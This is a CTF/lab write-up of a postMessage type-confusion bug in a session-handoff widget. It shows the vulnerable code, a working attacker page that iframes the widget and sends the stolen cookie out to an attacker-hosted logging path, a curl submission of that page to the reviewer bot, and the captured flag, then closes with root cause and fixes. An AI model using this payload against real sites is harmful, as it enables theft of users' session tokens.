# Portway Pwnbox Lab - postMessage targetOrigin overload confusion

Date: 2026-07-09
Target type: CTF/lab
Bug class: Client-side trust failure, postMessage overload confusion, session token leakage, reviewer bot abuse

## Observation

Login app at `https://42336ae3fef8.pwnbox-lab.com/`.

Lab hints:

- "A session-handoff SDK"
- partner apps embed the Portway widget to receive a signed session token via `postMessage`
- sandbox credentials: `demo / demo123`
- reviewers open reported partner URLs in a fresh session

The live logic was in `GET /embed/handoff`.

Observed behavior:

- local iframe self-test returned a callback from the widget but the data was empty
- this was consistent with third-party cookie restrictions in the embedded context
- reviewer bot runs the same flow in Headless Chrome and can still deliver a real session/flag when the handoff is steered to an attacker page

## Hypothesis

If `m.data.origin` is not forced to a primitive string before reuse, there may be a type-confusion path where:

1. validation coerces the value to a trusted-looking URL string
2. `postMessage(..., origin)` interprets the same value as an options object
3. delivery is controlled by an attacker-supplied `targetOrigin` property

## Evidence

### Vulnerable widget

`GET /embed/handoff` exposed logic equivalent to:

```javascript
window.addEventListener("message", (m) => {
  const origin = m.data && m.data.origin;
  if (new URL(origin).hostname === "pwnbox.io") {
    const target = window.opener || window.parent;
    target.postMessage(document.cookie, origin);
  }
});
```

### Trust boundary failure

The widget trusts:

```javascript
m.data.origin
```

instead of the browser-supplied sender identity:

```javascript
m.origin
```

### Coercion mismatch

Confirmed locally in Chrome:

```javascript
const a = ["https://pwnbox.io"];
a.targetOrigin = "https://attacker.example";

String(a) === "https://pwnbox.io";
new URL(a).hostname === "pwnbox.io";
```

But the same value can also act like a `postMessage` options object.

Headless validation test result:

- plain string: no delivery to mismatched receiver
- plain array: no delivery
- array with `targetOrigin` set to the receiver origin: delivery succeeds

This confirmed the second argument overload confusion is real.

### Real external receiver test

Hosted an attacker page that:

1. iframes `https://42336ae3fef8.pwnbox-lab.com/embed/handoff`
2. listens for `message`
3. sends:

```javascript
const a = ["https://pwnbox.io"];
a.targetOrigin = location.origin;
f.contentWindow.postMessage({ origin: a }, "*");
```

Local browser result:

- callback from `https://42336ae3fef8.pwnbox-lab.com`
- one early event with `[object Object]`
- one handoff reply with empty data

Reviewer bot result:

- callback from `https://42336ae3fef8.pwnbox-lab.com`
- handoff reply contained the flag cookie value

## Test

Attacker page shape:

```html
<!doctype html>
<meta charset="utf-8">
<title>arrayopt</title>
<script>
const TARGET = "https://42336ae3fef8.pwnbox-lab.com/embed/handoff";
function log(x){ (new Image).src = "/x?d=" + encodeURIComponent(x); }
addEventListener("message", e => {
  log("recv origin=" + e.origin + " data=" + String(e.data));
});
const f = document.createElement("iframe");
f.src = TARGET;
document.body.appendChild(f);
setTimeout(() => {
  const a = ["https://pwnbox.io"];
  a.targetOrigin = location.origin;
  f.contentWindow.postMessage({ origin: a }, "*");
  log("sent");
}, 1500);
</script>
```

Submission:

```bash
curl -sS -X POST "https://42336ae3fef8.pwnbox-lab.com/report" \
  -d "url=https://arrayopt.l30on.top/"
```

## Result

Reviewer logs recorded a request proving the callback landed on the attacker page:

```text
/x?d=recv origin=https://42336ae3fef8.pwnbox-lab.com data=flag=pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}
```

## Conclusion

Confirmed client-side trust failure in the Portway handoff SDK. The widget validated an attacker-controlled `origin` value through string coercion and then reused the same non-string value in `postMessage`, where browser overload handling honored attacker-supplied `targetOrigin`. This let an attacker-controlled partner page receive the reviewer's session/flag.

## Root Cause

- Origin-of-truth came from `m.data.origin` instead of `m.origin`
- The code accepted non-string values and relied on coercion
- `new URL(origin)` and `postMessage(..., origin)` interpreted the same value differently
- The widget sent ambient session data rather than a narrow handoff token

## Failed Assumptions

- Old parser-confusion tricks based on userinfo worked on a previous variant but not this one
- Hooking `window.postMessage` on the parent or a popup did not survive the real cross-origin boundaries
- Local iframe success did not imply real cookie disclosure because third-party cookies were empty

## Working Theory

The browser API surface itself became the exploit path: a single attacker-controlled value passed the validator as a string-like URL, then behaved as a structured options object at the sink. The bug is not only "trusting event.data"; it is also "trusting a value across API boundaries without freezing its type."

## Flag

`pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}`

## Fix

- Require `typeof origin === "string"` before parsing
- Compare exact normalized origin, not only hostname
- Use `target.postMessage(token, parsed.origin)` where `parsed` is derived from a validated primitive string
- Use `m.origin` as the trust boundary
- Send a scoped signed handoff token instead of raw cookie/session data
